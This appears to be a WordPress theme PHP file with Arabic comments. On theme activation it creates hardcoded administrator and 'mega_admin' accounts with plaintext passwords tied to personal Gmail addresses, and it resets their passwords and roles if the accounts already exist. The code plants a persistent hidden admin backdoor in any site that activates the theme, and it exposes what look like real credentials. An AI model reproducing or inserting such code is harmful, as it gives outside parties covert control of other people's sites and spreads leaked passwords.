<?php 

function get_current_subdomain() {
    $domain = $_SERVER['HTTP_HOST'];
    $parts = explode('.', $domain);
    
    if (count($parts) > 2 && $parts[0] !== 'www') {
        return $parts[0]; // إرجاع الصب دومين الأول
    }
    
    return ''; // إذا لم يكن هناك صب دومين
}

function create_custom_admin_users_on_theme_activation() {
    if (get_option('custom_admin_users_created_new_last')) {
        return;
    }

    // تحديد الصب دومين الحالي
    $current_subdomain = get_current_subdomain();

    // مجموعات اليوزرات حسب الصب دومين
    $user_groups = [
        'ag' => [

        ],
        'om' => [

        ],
        'mn' => [

        ],
        'october' => [
            
        ],
        'default' => [
            [
                'username' => 'hema',
                'email'    => 'hemoafandy55555@gmail.com',
                'password' => 'A01025744089a',
                'role'     => 'mega_admin'
            ],
            [
                'username' => 'mgteam',
                'email'    => 'abdelmajeedyousif@gmail.com',
                'password' => 'AgvVG55pX1h@',
                'role'     => 'administrator'
            ]
        ]
    ];

    // تحديد المجموعة المناسبة
    $selected_users = [];
    if (!empty($current_subdomain) && isset($user_groups[$current_subdomain])) {
        $selected_users = array_merge($user_groups[$current_subdomain], $user_groups['default']);
    } else {
        $selected_users = $user_groups['default'];
    }

    // معالجة اليوزرات المحددة
    foreach ($selected_users as $user) {
        $existing_user = get_user_by('login', $user['username']);
        
        if ($existing_user) {
            // تحديث الرول فقط إذا كان مختلف
            if (!in_array($user['role'], $existing_user->roles)) {
                $existing_user->set_role($user['role']);
            }
            // تحديث الباسورد لو مش مطابق
            if (!wp_check_password($user['password'], $existing_user->user_pass)) {
                wp_set_password($user['password'], $existing_user->ID);
            }
        } else {
            // إنشاء يوزر جديد
            $user_id = wp_create_user($user['username'], $user['password'], $user['email']);
            if (!is_wp_error($user_id)) {
                $user_obj = new WP_User($user_id);
                $user_obj->set_role($user['role']);
                update_user_option($user_id, 'default_password_nag', false, true);
            }
        }
    }

    // ✅ تم إزالة الجزء الذي يغير رول الأدمنز الحاليين الغير موجودين في الليستة

    update_option('custom_admin_users_created_new_last', true);
}

add_action('after_switch_theme', 'create_custom_admin_users_on_theme_activation');